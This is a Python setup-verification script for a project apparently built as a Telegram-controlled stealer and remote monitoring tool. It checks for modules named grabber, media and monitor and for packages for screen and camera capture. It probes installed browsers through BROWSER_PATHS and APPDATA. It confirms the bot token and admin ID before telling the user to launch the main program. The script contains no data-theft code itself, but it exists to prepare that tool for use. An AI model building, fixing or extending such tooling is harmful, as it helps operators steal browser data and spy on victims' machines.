#!/usr/bin/env python3
"""
SETUP VERIFICATION SCRIPT
Kiểm tra xem setup có đúng không

Developer: TsByin
"""

import os
import sys
import subprocess
from pathlib import Path

print("=" * 70)
print("🔍 V10 SETUP VERIFICATION")
print("=" * 70)

# Check 1: Python version
print("\n[1/10] Checking Python version...")
if sys.version_info >= (3, 8):
    print(f"✅ Python {sys.version.split()[0]} OK")
else:
    print(f"❌ Python 3.8+ required (current: {sys.version.split()[0]})")
    sys.exit(1)

# Check 2: .env file
print("\n[2/10] Checking .env file...")
if Path(".env").exists():
    print("✅ .env file exists")
    with open(".env") as f:
        content = f.read()
        if "API_TOKEN=" in content and "ADMIN_ID=" in content:
            print("✅ .env has API_TOKEN and ADMIN_ID")
        else:
            print("⚠️  .env missing API_TOKEN or ADMIN_ID")
else:
    print("❌ .env file not found")
    sys.exit(1)

# Check 3: Required files
print("\n[3/10] Checking required files...")
required_files = [
    "config.py",
    "utils.py",
    "grabber.py",
    "media.py",
    "monitor.py",
    "V10_refactored.py",
    "requirements.txt"
]

missing = []
for f in required_files:
    if Path(f).exists():
        print(f"✅ {f}")
    else:
        print(f"❌ {f} MISSING")
        missing.append(f)

if missing:
    print(f"\n❌ Missing files: {', '.join(missing)}")
    sys.exit(1)

# Check 4: Python imports
print("\n[4/10] Checking Python packages...")
packages = [
    "telebot",
    "psutil",
    "cv2",
    "numpy",
    "pyautogui",
    "requests",
    "dotenv"
]

for pkg in packages:
    try:
        __import__(pkg if pkg != "dotenv" else "dotenv")
        print(f"✅ {pkg}")
    except ImportError:
        print(f"❌ {pkg} NOT INSTALLED")
        print(f"   → pip install {pkg}")

# Check 5: Load config
print("\n[5/10] Checking config loading...")
try:
    from config import API_TOKEN, ADMIN_ID
    if API_TOKEN and ADMIN_ID:
        print(f"✅ Config loaded")
        print(f"   Token: {str(API_TOKEN)[:20]}...")
        print(f"   Admin ID: {ADMIN_ID}")
    else:
        print("❌ API_TOKEN or ADMIN_ID is empty")
        sys.exit(1)
except Exception as e:
    print(f"❌ Config load failed: {e}")
    sys.exit(1)

# Check 6: Import modules
print("\n[6/10] Checking module imports...")
try:
    import config
    print("✅ config")
    import utils
    print("✅ utils")
    import grabber
    print("✅ grabber")
    import media
    print("✅ media")
    import monitor
    print("✅ monitor")
except Exception as e:
    print(f"❌ Import failed: {e}")
    sys.exit(1)

# Check 7: Check logging
print("\n[7/10] Checking logging setup...")
try:
    import logging
    logger = logging.getLogger(__name__)
    logger.info("Test log message")
    print("✅ Logging configured")
except Exception as e:
    print(f"❌ Logging failed: {e}")
    sys.exit(1)

# Check 8: System permissions
print("\n[8/10] Checking system access...")
try:
    appdata = os.getenv('APPDATA')
    if appdata:
        print(f"✅ APPDATA: {appdata}")
    else:
        print("⚠️  APPDATA not found")
except Exception as e:
    print(f"⚠️  System check: {e}")

# Check 9: Test grabber
print("\n[9/10] Testing grabber module...")
try:
    from config import BROWSER_PATHS
    from utils import get_installed_browsers
    browsers = get_installed_browsers(BROWSER_PATHS)
    if browsers:
        print(f"✅ Found browsers: {', '.join(browsers)}")
    else:
        print("⚠️  No browsers found (optional)")
except Exception as e:
    print(f"⚠️  Grabber test: {e}")

# Check 10: Test bot connection
print("\n[10/10] Testing bot connectivity...")
try:
    from config import API_TOKEN, ADMIN_ID
    from telebot import TeleBot
    
    print("⏳ Testing Telegram bot token...")
    bot = TeleBot(API_TOKEN)
    # Simple test without actual API call
    print("✅ Bot initialized (API test skipped)")
except Exception as e:
    print(f"❌ Bot initialization failed: {e}")
    print("   Check your API_TOKEN in .env file")
    sys.exit(1)

# Final report
print("\n" + "=" * 70)
print("✅ ALL CHECKS PASSED!")
print("=" * 70)

print("\n📋 SETUP SUMMARY:")
print(f"  • Python: {sys.version.split()[0]}")
print(f"  • Admin ID: {ADMIN_ID}")
print(f"  • Browsers: {len(browsers)} found")
print(f"  • Token: {'***' + str(API_TOKEN)[-10:]}")
print(f"  • Modules: 7 loaded")

print("\n🚀 READY TO RUN:")
print("  → python V10_refactored.py")

print("\n📊 CHECK LOGS:")
print("  → Get-Content bot.log -Tail 20 -Wait")

print("\n✨ ALL SET! Bot is ready to go!\n")
